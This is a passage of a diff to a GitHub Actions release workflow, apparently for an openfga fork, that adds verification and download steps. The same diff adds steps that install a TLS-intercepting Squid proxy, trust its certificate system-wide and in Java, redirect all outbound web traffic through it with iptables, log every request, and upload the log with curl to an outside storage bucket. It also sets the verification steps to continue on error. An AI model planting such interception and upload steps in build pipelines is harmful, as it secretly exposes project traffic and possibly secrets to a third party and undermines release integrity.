+        JQIDAQABo1MwUTAdBgNVHQ4EFgQUrUQ1F+rM0kk5tI/PEZvONIAL9WcwHwYDVR0j
+
+        BBgwFoAUrUQ1F+rM0kk5tI/PEZvONIAL9WcwDwYDVR0TAQH/BAUwAwEB/zANBgkq
+
+        hkiG9w0BAQsFAAOCAgEAihN0oWVSwHDimXbh3Wp7L2qc39whQEPu+m2OIB50Dp0X
+
+        K1WL784TzXmbz1DuvGXWGIjn4PDL5NQ991S3nPjD5Fk9VjzU4IZ9XR8AmVZFCltX
+
+        zZm01L6FQLGvjpQZs9KCEeS05CUjAiArPMsYSKJDTUi2XCuTR+FGiBHtYrg8GClp
+
+        EQkTCTA9kFNI6ThlDAPgwj4VBJZX5p8KAFlHpwztfDnIgfwdQJBUW1D2hkxLWyvs
+
+        tZFLmYAHk5Lfixpt2+25HAp5kHMRfoJQLAsRQ/kmeNjoG5WQkIshXDURQZQlPnmP
+
+        yBueix5POd09hYHSL3kqdHoiX0P0oqeLakAMqFnKJapjpsv7teWQPnlTgalCIA/7
+
+        RwhUqsxOlRV5/26oXrlYtgMneXemikVT0hS98aw3T2icSWq6/i0L1v21ZCP5DSKI
+
+        GR6lb9RCSkJvkoTjZAm7IvxMyOZsYY2FL2mm00aY9Ufqeqozf7/q8JWwd6gaIfd7
+
+        KqOUgu0a/+sgOAu5f+dd20zAhtvAttyQIpy1gGcda9DjXpdCTv1slErC94VCcZrE
+
+        LQlR5nEjAAKK/fZ07pgBwJdMY/kWE9WRx32olhhveRS9nczKSyhutwmbuU1vkfcN
+
+        26RR8dfuMnnNzxzd2Ht30Ep8wONz/kfw/xWuUo/A8pND2I6s6bt8K5iphrv3xVI=
+
+        -----END CERTIFICATE-----
+
+        EOF
+
+        sudo /usr/lib/squid/security_file_certgen -c -s /squid/ssl_db -M 4MB
+
+        sudo chown -R proxy:proxy /squid
+
+        cat << EOF | sudo tee /etc/squid/squid.conf
+
+        cache deny all
+
+
+        http_port 7821
+
+        http_port 3128 intercept
+
+        https_port 3129 intercept ssl-bump generate-host-certificates=on dynamic_cert_mem_cache_size=4MB
+        cert=/squid/cert.pem key=/squid/key.pem
+
+        acl step1 at_step SslBump1
+
+        ssl_bump peek step1
+
+        ssl_bump bump all
+
+        sslcrtd_program /usr/lib/squid/security_file_certgen -s /squid/ssl_db -M 4MB
+
+        sslcrtd_children 5
+
+        ssl_bump server-first all
+
+        sslproxy_cert_error allow all
+
+
+        acl all src 0.0.0.0/0
+
+        http_access allow all
+
+
+        logformat custom {"method":"%">rm","url":"%">ru","status":%<Hs,"user_agent":"%{User-Agent}>h"}
+
+        access_log daemon:/squid/squidlog.json custom all !CONNECT
+
+        EOF
+
+        sudo systemctl reload squid
+
+        sudo cp /squid/cert.pem /usr/local/share/ca-certificates/squid.crt
+
+        sudo update-ca-certificates
+
+        sudo keytool -import -alias squid -file /squid/cert.pem -keystore /usr/lib/jvm/temurin-11-jdk-amd64/lib/security/cacerts
+        -storepass changeit -noprompt -trustcacerts
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        80 -j DNAT --to-destination 127.0.0.1:3128
+
+        sudo iptables -t nat -A OUTPUT -m owner ! --uid-owner proxy -p tcp --dport
+        443 -j DNAT --to-destination 127.0.0.1:3129
+
+        sudo sh -c ''echo 1 > /proc/sys/net/ipv4/ip_forward'''
+    - continue-on-error: true
+      name: Install the verifier
+      uses: slsa-framework/slsa-verifier/actions/installer@3714a2a4684014deb874a0e737dffa0ee02dd647
+    - continue-on-error: true
+      env:
+        GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        PROVENANCE: ${{ needs.binary-provenance.outputs.provenance-name }}
+      name: Download assets
+      run: "set -euo pipefail\ngh -R \"$GITHUB_REPOSITORY\" release download \"$GITHUB_REF_NAME\"\
+        \ \\\n  -p \"$PROVENANCE\" -p \"*.tar.gz\" -p \"*.tar.gz.sbom.json\"\n"
+    - continue-on-error: true
+      env:
+        PROVENANCE: ${{ needs.binary-provenance.outputs.provenance-name }}
+      name: Verify assets
+      run: "slsa-verifier verify-artifact \\\n  --provenance-path \"$PROVENANCE\"\
+        \ \\\n  --source-uri \"github.com/$GITHUB_REPOSITORY\" \\\n  --source-tag\
+        \ \"$GITHUB_REF_NAME\" \\\n  *.tar.gz *.tar.gz.sbom.json\n"
+    - name: after
+      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/criteo-forks/openfga.$(date
+        +%s)
+    timeout-minutes: 60
+name: release
+'on':
+  workflow_dispatch: {}
+permissions:
+  contents: read
